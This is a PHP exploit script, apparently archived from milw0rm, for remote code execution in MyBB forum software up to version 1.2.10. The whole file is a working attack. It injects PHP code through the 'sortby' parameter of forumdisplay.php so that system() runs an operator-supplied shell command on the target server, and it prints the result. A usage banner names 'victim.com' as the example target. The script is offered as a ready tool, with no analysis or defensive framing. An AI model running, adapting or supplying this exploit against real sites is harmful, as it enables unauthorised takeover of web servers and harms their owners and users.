#!/usr/bin/php -q -d short_open_tag=on
<?php

// magic_quotes_gpc needs to be off

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<5) {
print "-------------------------------------------------------------------------\r\n";
print "                 MyBB <= 1.2.10 Remote Code Execution Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_mybb.php [HOST] [PATH] [FORUM_ID] [COMMAND]\r\n\r\n";
print "[HOST] 	  = Target server's hostname or ip address\r\n";
print "[PATH] 	  = Path where MyBB is located\r\n";
print "[FORUM_ID] = Valid forum ID\r\n";
print "[COMMAND]  = Command to execute\r\n\r\n";
print "e.g. w4ck1ng_mybb.php victim.com /mybb/ 1 id\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
die;
}

//Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host = $argv[1];
$path = $argv[2];
$fid  = $argv[3];
$cmd  = $argv[4];
$cmd  = urlencode($cmd);
$port=80;$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

    $sql = "forumdisplay.php?fid=$fid&sortby=']=1;echo%20'*';%20system('$cmd');echo%20'*';%20\$orderarrow['";
    $packet ="GET " . $path . $sql . " HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

     $temp=explode("*",$html);
     $temp2=explode("*",$temp[1]);

    print "-------------------------------------------------------------------------\r\n";
    print "                MyBB <= 1.2.10 Remote Code Execution Exploit\r\n";    
    print "-------------------------------------------------------------------------\r\n";
    echo  $temp2[0];
    print "-------------------------------------------------------------------------\r\n";
    print "                          http://www.w4ck1ng.com\r\n";
    print "                                 ...Silentz\r\n";
    print "-------------------------------------------------------------------------\r\n";


?>

# milw0rm.com [2008-01-16]
